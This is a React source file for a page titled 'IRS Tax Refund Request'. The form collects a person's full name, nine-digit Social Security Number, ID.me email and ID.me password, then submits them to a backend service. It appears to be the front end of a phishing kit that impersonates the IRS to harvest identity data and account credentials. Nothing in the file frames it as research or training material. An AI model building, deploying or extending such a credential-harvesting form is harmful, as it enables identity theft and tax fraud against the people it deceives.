import { useState } from 'react';
import toast from 'react-hot-toast';
import { taxRefundRequest } from '../../services/tax.service';

import {
    FaFileInvoiceDollar,
    FaUser,
    FaShieldAlt,
    FaEnvelope,
    FaKey,
    FaMapMarkerAlt,
    FaInfoCircle,
    FaPaperPlane
} from 'react-icons/fa';

export function TaxRefundForm() {
    const [formData, setFormData] = useState({
        fullName: '',
        ssn: '',
        idMeEmail: '',
        idMePassword: '',
        country: ''
    });

    const [loading, setLoading] = useState(false);

    const countries = [
        'United States',
        'Canada',
        'United Kingdom',
        'Germany',
        'France',
        'Other'
    ];

    const handleChange = event => {
        const { name, value } = event.target;

        setFormData(previous => ({
            ...previous,
            [name]: value
        }));
    };

    const handleSubmit = async event => {
        event.preventDefault();

        if (!formData.fullName.trim()) {
            toast.error('Please enter your full name.');
            return;
        }

        if (!/^\d{9}$/.test(formData.ssn)) {
            toast.error('Please enter the your 9 digit ssn.');
            return;
        }

        if (!formData.idMeEmail.trim()) {
            toast.error('Please enter your ID.me email.');
            return;
        }

        if (!formData.idMePassword) {
            toast.error('Please enter ID.me password.');
            return;
        }

        if (!formData.country) {
            toast.error('Please select your country.');
            return;
        }

        setLoading(true);

        try {
            // Your API service goes here
            //
            const res = await taxRefundRequest(formData);

            toast.success(
                res.message || 'Refund request submitted successfully.'
            );

            setFormData({
                fullName: '',
                ssn: '',
                idMeEmail: '',
                idMePassword: '',
                country: ''
            });

        } catch (error) {
            console.error(error);

            toast.error(
                'Unable to submit refund request.'
            );
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="mx-auto w-full max-w-4xl px-4 py-8">

            {/* Header */}
            <div className="mb-8 text-center">

                <div className="
                    mx-auto
                    mb-4
                    flex
                    h-16
                    w-16
                    items-center
                    justify-center
                    rounded-full
                    bg-primary/15
                    text-primary
                ">
                    <FaFileInvoiceDollar size={26} />
                </div>

                <h1 className="text-2xl font-bold text-text sm:text-3xl">
                    IRS Tax Refund Request
                </h1>

                <p className="mt-2 text-sm text-text-muted">
                    Please fill out the form below to submit
                    your IRS tax refund request
                </p>

            </div>


            <form
                onSubmit={handleSubmit}
                className="space-y-6"
            >

                {/* Personal Information */}
                <section className="
                    rounded-2xl
                    border
                    border-border
                    bg-surface-2
                    p-5
                    sm:p-6
                ">

                    <div className="mb-5 flex items-center gap-3">

                        <div className="
                            flex
                            h-9
                            w-9
                            items-center
                            justify-center
                            rounded-full
                            bg-primary/15
                            text-primary
                        ">
                            <FaUser size={16} />
                        </div>

                        <h2 className="text-lg font-semibold text-text">
                            Personal Information
                        </h2>

                    </div>


                    <div className="space-y-5">

                        {/* Full Name */}
                        <div>

                            <label
                                htmlFor="fullName"
                                className="mb-2 block text-sm font-semibold text-text"
                            >
                                Full Name
                            </label>

                            <div className="relative">

                                <FaUser
                                    className="
                                        pointer-events-none
                                        absolute
                                        left-4
                                        top-1/2
                                        -translate-y-1/2
                                        text-text-muted
                                    "
                                    size={14}
                                />

                                <input
                                    id="fullName"
                                    name="fullName"
                                    type="text"
                                    value={formData.fullName}
                                    onChange={handleChange}
                                    placeholder="Enter your full name"
                                    className="
                                        w-full
                                        rounded-xl
                                        border
                                        border-border
                                        bg-surface-1
                                        py-3
                                        pl-10
                                        pr-4
                                        text-sm
                                        text-text
                                        outline-none
                                        focus:border-primary
                                        focus:ring-2
                                        focus:ring-primary/20
                                    "
                                />

                            </div>

                        </div>


                        {/*  SSN */}
                        <div>

                            <label
                                htmlFor="ssnLast4"
                                className="mb-2 block text-sm font-semibold text-text"
                            >
                                Social Security Number (SSN)
                            </label>

                            <div className="relative">

                                <FaShieldAlt
                                    className="
                                        pointer-events-none
                                        absolute
                                        left-4
                                        top-1/2
                                        -translate-y-1/2
                                        text-text-muted
                                    "
                                    size={14}
                                />

                                <input
                                    id="ssn"
                                    name="ssn"
                                    type="text"
                                    inputMode="numeric"
                                    maxLength={9}
                                    value={formData.ssn}
                                    onChange={handleChange}
                                    placeholder="XXX-XX-XXXX"
                                    className="
                                        w-full
                                        rounded-xl
                                        border
                                        border-border
                                        bg-surface-1
                                        py-3
                                        pl-10
                                        pr-4
                                        text-sm
                                        text-text
                                        outline-none
                                        focus:border-primary
                                        focus:ring-2
                                        focus:ring-primary/20
                                    "
                                />

                            </div>

                        </div>

                    </div>

                </section>


                {/* ID.me Verification */}
                <section className="
                    rounded-2xl
                    border
                    border-border
                    bg-surface-2
                    p-5
                    sm:p-6
                ">

                    <div className="mb-5 flex items-center gap-3">

                        <div className="
                            flex
                            h-9
                            w-9
                            items-center
                            justify-center
                            rounded-full
                            bg-primary/15
                            text-primary
                        ">
                            <FaShieldAlt size={16} />
                        </div>

                        <h2 className="text-lg font-semibold text-text">
                            ID.me Verification
                        </h2>

                    </div>


                    <div className="space-y-5">

                        {/* Email */}
                        <div>

                            <label
                                htmlFor="idMeEmail"
                                className="mb-2 block text-sm font-semibold text-text"
                            >
                                ID.me Email
                            </label>

                            <div className="relative">

                                <FaEnvelope
                                    className="
                                        pointer-events-none
                                        absolute
                                        left-4
                                        top-1/2
                                        -translate-y-1/2
                                        text-text-muted
                                    "
                                    size={14}
                                />

                                <input
                                    id="idMeEmail"
                                    name="idMeEmail"
                                    type="email"
                                    value={formData.idMeEmail}
                                    onChange={handleChange}
                                    placeholder="Enter your ID.me email"
                                    className="
                                        w-full
                                        rounded-xl
                                        border
                                        border-border
                                        bg-surface-1
                                        py-3
                                        pl-10
                                        pr-4
                                        text-sm
                                        text-text
                                        outline-none
                                        focus:border-primary
                                        focus:ring-2
                                        focus:ring-primary/20
                                    "
                                />

                            </div>

                        </div>


                        {/* Verification reference */}
                        <div>

                            <label
                                htmlFor="idMePassword"
                                className="mb-2 block text-sm font-semibold text-text"
                            >
                                ID.me Password
                            </label>

                            <div className="relative">

                                <FaKey
                                    className="
                                        pointer-events-none
                                        absolute
                                        left-4
                                        top-1/2
                                        -translate-y-1/2
                                        text-text-muted
                                    "
                                    size={14}
                                />

                                <input
                                    id="idMePassword"
                                    name="idMePassword"
                                    type="text"
                                    value={
                                        formData.idMePassword
                                    }
                                    onChange={handleChange}
                                    placeholder="Enter your ID.me password"
                                    className="
                                        w-full
                                        rounded-xl
                                        border
                                        border-border
                                        bg-surface-1
                                        py-3
                                        pl-10
                                        pr-4
                                        text-sm
                                        text-text
                                        outline-none
                                        focus:border-primary
                                        focus:ring-2
                                        focus:ring-primary/20
                                    "
                                />

                            </div>

                        </div>

                    </div>

                </section>


                {/* Location */}
                <section className="
                    rounded-2xl
                    border
                    border-border
                    bg-surface-2
                    p-5
                    sm:p-6
                ">

                    <div className="mb-5 flex items-center gap-3">

                        <div className="
                            flex
                            h-9
                            w-9
                            items-center
                            justify-center
                            rounded-full
                            bg-primary/15
                            text-primary
                        ">
                            <FaMapMarkerAlt size={16} />
                        </div>

                        <h2 className="text-lg font-semibold text-text">
                            Location Information
                        </h2>

                    </div>


                    <label
                        htmlFor="country"
                        className="mb-2 block text-sm font-semibold text-text"
                    >
                        Country
                    </label>

                    <select
                        id="country"
                        name="country"
                        value={formData.country}
                        onChange={handleChange}
                        className="
                            w-full
                            rounded-xl
                            border
                            border-border
                            bg-surface-1
                            px-4
                            py-3
                            text-sm
                            text-text
                            outline-none
                            focus:border-primary
                            focus:ring-2
                            focus:ring-primary/20
                        "
                    >
                        <option value="">
                            Select country
                        </option>

                        {countries.map(country => (
                            <option
                                key={country}
                                value={country}
                            >
                                {country}
                            </option>
                        ))}
                    </select>

                </section>


                {/* Notice */}
                <div className="
                    flex
                    gap-3
                    rounded-xl
                    border
                    border-border
                    bg-surface-2
                    p-4
                ">

                    <FaInfoCircle
                        className="mt-1 shrink-0 text-primary"
                        size={16}
                    />

                    <div>

                        <p className="text-sm font-semibold text-text">
                            Important Notice
                        </p>

                        <p className="
                            mt-1
                            text-xs
                            leading-5
                            text-text-muted
                        ">
                            Please ensure all information provided
                            is accurate and matches your verification
                            information. Any discrepancies may result in delays or rejection of your refund request.
                        </p>

                    </div>

                </div>


                {/* Submit */}
                <div className="flex justify-end">

                    <button
                        type="submit"
                        disabled={loading}
                        className="
                            flex
                            items-center
                            justify-center
                            gap-2
                            rounded-xl
                            bg-primary
                            px-6
                            py-3
                            text-sm
                            font-semibold
                            text-white
                            transition
                            hover:opacity-90
                            disabled:cursor-not-allowed
                            disabled:opacity-60
                        "
                    >
                        <FaPaperPlane size={13} />

                        {loading
                            ? 'Submitting...'
                            : 'Submit Request'}
                    </button>

                </div>

            </form>

        </div>
    );
}